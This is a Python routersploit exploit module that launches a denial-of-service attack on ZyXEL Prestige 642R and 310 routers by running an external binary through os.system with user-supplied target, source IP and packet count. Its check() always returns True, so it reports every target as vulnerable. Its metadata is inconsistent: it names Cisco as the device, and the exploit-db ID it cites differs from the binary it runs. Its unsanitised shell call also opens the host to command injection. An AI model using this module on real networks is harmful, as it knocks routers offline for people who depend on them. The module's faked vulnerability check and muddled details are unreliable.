import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "ZYXEL_Prestige_642R_Router-Malformed_IP_acket_Denial_of_Service",

        "description": "ZyXEL 642R and Prestige 310 routers have difficulties handling IP packets that are malformed. Reportedly, "
                       " when ZyXEL routers receive a single specially malformed packet, they stop responding for exactly 30 seconds. "
                       "ZyXEL 642R and Prestige 310 routers are reportedly affected by this vulnerability. It is possible that "
                       "other ZyNOS-based routers are also affected by this vulnerability ",

        "authors": (

            "Jeff w. Roberson",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/21673",

        ),

        "devices": (

            "Cisco, CVE-2002-1072"
        ),
    }


    target = OptIP("", "target ip ")
    num = OptString("","number of packets ")
    src_ip = OptIP("","source ip_addr")


    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = "./{} {} {} {}".format("exploit-db-21637",self.target,self.src_ip,self.num)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True